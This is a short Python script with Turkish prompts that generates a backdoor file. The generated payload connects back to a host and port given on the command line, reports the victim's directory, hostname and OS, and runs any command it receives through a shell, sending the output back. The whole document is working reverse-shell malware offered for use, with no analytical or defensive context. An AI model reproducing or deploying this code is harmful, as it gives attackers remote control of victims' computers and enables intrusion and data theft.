#!/usr/bin/python3
import sys
import os
#b4ck OPEN-SOURCE PROJECT
source = """
#!/usr/bin/python3
#Bu dosya b4ck.py tarafından oluşturulmuş ve Hichigo tarafından yayınlanmıştır->THT
import socket
import time
import sys
import subprocess
import platform
import os

def Main():
    host = "{}"
    port = {}

    my_socket = socket.socket()
    handler = 0
    while handler != 1:
     try:
      my_socket.connect((host, port))
      handler = 1
     except ConnectionRefusedError:
      time.sleep(1)
      pass
    message1 = "ss"+os.getcwd()+" "+socket.gethostname()+" "+platform.system()+"ssss"
    message2 = ""

    while message1 != 'q':
     my_socket.send(message1.encode())
     my_socket.send(message2.encode())
     data = my_socket.recv(2028).decode()
     l=str(data)
     out=subprocess.Popen(l, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
     message1 = str(out.stdout.read())
     message2 = str(out.stderr.read())

    my_socket.close()

while True:
 try:
  Main()
 except:
  time.sleep(1)
  Main()

"""
ask = input("     Yeni bir dosya oluşturayım mı? [E,H]")
if ask == "H":
     exit()

yol = input("     Lütfen yol ve ismini girin /root/hichigo.py:")
f = open( yol,"w")
f.write((source.format(sys.argv[1],sys.argv[2])))
print ("    BACKDOOR Kurulumu Başarılı")




